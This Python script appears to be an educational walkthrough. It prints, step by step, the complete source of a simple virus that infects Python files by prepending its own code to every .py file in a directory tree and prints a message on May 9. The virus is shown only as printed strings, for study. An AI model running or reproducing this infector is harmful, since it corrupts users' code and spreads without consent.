#!/usr/bin/env python3

#Script Name:               Python Malware Analysis
# Author:                   Nathalie Abdallah
# Date of latest revision:  12/14/2023
# Purpose:                  Python Malware Analysis 

# Not a virus

# This script can be ran. It is meant to be ran, in order to follow along and read what each part of the script does

import os
import datetime

def print_step(step_title, step_content):
    input(f"\nPress Enter to see {step_title}...")
    print(f"\n----- {step_title} -----\n\n{step_content}\n")

# Step 1
step1_title = "Shebang and Imports"
step1_content = """\
#!/usr/bin/python3
import os
import datetime
"""

print_step(step1_title, step1_content)

# Step 2
step2_title = "Virus Signature"
step2_content = """\
# Virus signature
SIGNATURE = "VIRUS"
"""

print_step(step2_title, step2_content)

# Step 3
step3_title = "Locate Function"
step3_content = """\
# Function to recursively locate Python files in a given directory
def locate(path):
    # List to store targeted files
    files_targeted = []
    
    # Retrieve the list of files in the specified path
    filelist = os.listdir(path)
    
    # Iterate through each file in the directory
    for fname in filelist:
        # Check if the file is a directory
        if os.path.isdir(path+"/"+fname):
            # Recursively call the locate function for subdirectories
            files_targeted.extend(locate(path+"/"+fname))
        # Check if the file has a ".py" extension
        elif fname[-3:] == ".py":
            # Check if the file is already infected by searching for the virus signature
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            # If the file is not infected, add it to the list of targeted files
            if not infected:
                files_targeted.append(path+"/"+fname)
    return files_targeted
"""

print_step(step3_title, step3_content)

# Step 4
step4_title = "Infect Function"
step4_content = """\
# Function to infect specified files by prepending the virus code to each file
def infect(files_targeted):
    # Open the virus script and extract the first 39 lines (virus code)
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i, line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    # Iterate through targeted files and prepend the virus code to each file
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname, "w")
        f.write(virusstring + temp)
        f.close()
"""

print_step(step4_title, step4_content)

# Step 5
step5_title = "Detonate Function"
step5_content = """\
# Function to check the current date and detonate the virus if conditions are met
def detonate():
    # Check if the current date is May 9th
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")
"""

print_step(step5_title, step5_content)

# Step 6
step6_title = "Main Execution"
step6_content = """\
# Locate Python files in the current directory and its subdirectories
files_targeted = locate(os.path.abspath(""))
# Infect the located files by adding the virus code to them
infect(files_targeted)
# Check if the current date is May 9th and print a message if true
detonate()
"""

print_step(step6_title, step6_content)
